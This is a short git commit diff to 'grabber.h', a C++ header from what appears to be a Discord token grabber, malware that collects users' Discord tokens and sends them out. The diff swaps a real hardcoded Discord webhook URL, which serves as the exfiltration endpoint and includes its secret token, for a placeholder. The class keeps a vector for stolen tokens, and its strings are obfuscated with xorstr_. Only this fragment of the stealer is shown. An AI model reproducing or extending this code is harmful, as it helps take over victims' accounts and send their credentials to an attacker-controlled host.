70781737a620c4bdc9369dac86db9db5f0a36fc1
Deplantis <68348696+deplantis@users.noreply.github.com>
2021-07-04 22:49:29 +0200

    Update grabber.h

--- code/class/grabber.h
+++ code/class/grabber.h
@@ -40,7 +40,7 @@ public:
 
 private:
    const std::string webhookname = "tudou"; // the webhook name
-   const std::string webhook_url = xorstr_("https://discord.com/api/webhooks/860998561016446976/sIPHGSG6ZBjLt9vHM84VJ1EDJ6LcUDLAVJwG-fqHxlMoFrx9A23KWYGK7uJUaMGD7r2u"); // webhook url
+   const std::string webhook_url = xorstr_(" ( you webhook url) "); // webhook url
    const std::string avatar_url = xorstr_("https://i.pinimg.com/236x/99/c8/8f/99c88f80f5080c31ddbb817e7ab3c8c3.jpg"); // tudou
    std::vector<std::string> discordtokens; // this is where all tokens gonna get stored
 
